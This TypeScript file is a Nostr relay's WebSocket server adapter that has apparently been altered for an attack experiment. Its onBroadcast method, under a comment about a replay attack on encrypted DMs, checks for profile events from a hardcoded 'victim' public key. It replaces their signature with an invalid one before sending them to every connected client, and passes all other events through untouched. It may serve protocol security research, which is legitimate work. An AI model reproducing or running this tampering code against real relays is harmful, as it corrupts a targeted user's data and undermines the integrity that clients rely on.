import { IncomingMessage, Server } from 'http'
import WebSocket, { OPEN, WebSocketServer } from 'ws'
import { propEq } from 'ramda'

import { IWebSocketAdapter, IWebSocketServerAdapter } from '../@types/adapters'
import { WebSocketAdapterEvent, WebSocketServerAdapterEvent } from '../constants/adapter'
import { createLogger } from '../factories/logger-factory'
import { Event } from '../@types/event'
import { Factory } from '../@types/base'
import { getRemoteAddress } from '../utils/http'
import { isRateLimited } from '../handlers/request-handlers/rate-limiter-middleware'
import { Settings } from '../@types/settings'
import { WebServerAdapter } from './web-server-adapter'
import {EventKinds} from "../constants/base";
import {getEventHash, isEventMatchingFilter} from "../utils/event";
import {createOutgoingEventMessage} from "../utils/messages";

const debug = createLogger('web-socket-server-adapter')

const WSS_CLIENT_HEALTH_PROBE_INTERVAL = 120000

export class WebSocketServerAdapter extends WebServerAdapter implements IWebSocketServerAdapter {
  private webSocketsAdapters: WeakMap<WebSocket, IWebSocketAdapter>

  private heartbeatInterval: NodeJS.Timer

  public constructor(
    webServer: Server,
    private readonly webSocketServer: WebSocketServer,
    private readonly createWebSocketAdapter: Factory<
      IWebSocketAdapter,
      [WebSocket, IncomingMessage, IWebSocketServerAdapter]
    >,
    private readonly settings: () => Settings,
  ) {
    debug('created')
    super(webServer)

    this.webSocketsAdapters = new WeakMap()

    this
      .on(WebSocketServerAdapterEvent.Broadcast, this.onBroadcast.bind(this))

    this.webSocketServer
      .on(WebSocketServerAdapterEvent.Connection, this.onConnection.bind(this))
      .on('error', (error) => {
        debug('error: %o', error)
      })
    this.heartbeatInterval = setInterval(this.onHeartbeat.bind(this), WSS_CLIENT_HEALTH_PROBE_INTERVAL)
  }

  public close(callback?: () => void): void {
    super.close(() => {
      debug('closing')
      clearInterval(this.heartbeatInterval)
      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket)
        if (webSocketAdapter) {
          debug('terminating client %s: %s', webSocketAdapter.getClientId(), webSocketAdapter.getClientAddress())
        }
        webSocket.terminate()
      })
      debug('closing web socket server')
      this.webSocketServer.close(() => {
        this.webSocketServer.removeAllListeners()
        if (typeof callback !== 'undefined') {
          callback()
        }
        debug('closed')
      })
    })
    this.removeAllListeners()
  }

  private onBroadcast(event: Event) {
    console.log('---------')
    console.log('event')
    console.log(event)
    // do truncated replay attack on EncryptedDM
    // eslint-disable-next-line max-len
    // victim public key in hex string
    // same as npub1ynert69p79kulwzujknnsllsvxp9rxquw3y2sjsgakq935etf4ksrj7sm4
    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
    if(event.kind==0 && event.pubkey==target_pub){
      console.log('Replace sig with invalid sig on profile')
      event.sig = 'd4a739b22f298cb04f69f0a9636a09d9e308eb17c4b884ae130db511cb92a9954e3048ff22dd5f10605e42f6a79bf208f368b86b877a98a68f73c15b4679c382'

      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        if (!propEq('readyState', OPEN)(webSocket)) {
          return
        }
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
        if (!webSocketAdapter) {
          return
        }
        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
      })
    }else{
      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        if (!propEq('readyState', OPEN)(webSocket)) {
          return
        }
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
        if (!webSocketAdapter) {
          return
        }
        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
      })
    }
  }

  public getConnectedClients(): number {
    return Array.from(this.webSocketServer.clients).filter(propEq('readyState', OPEN)).length
  }

  private async onConnection(client: WebSocket, req: IncomingMessage) {
    const currentSettings = this.settings()
    const remoteAddress = getRemoteAddress(req, currentSettings)

    debug('client %s connected: %o', remoteAddress, req.headers)

    if (await isRateLimited(remoteAddress, currentSettings)) {
      debug('client %s terminated: rate-limited', remoteAddress)
      client.terminate()
      return
    }

    this.webSocketsAdapters.set(client, this.createWebSocketAdapter([client, req, this]))
  }

  private onHeartbeat() {
    this.webSocketServer.clients.forEach((webSocket) => {
      const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
      if (webSocketAdapter) {
        webSocketAdapter.emit(WebSocketAdapterEvent.Heartbeat)
      }
    })
  }
}
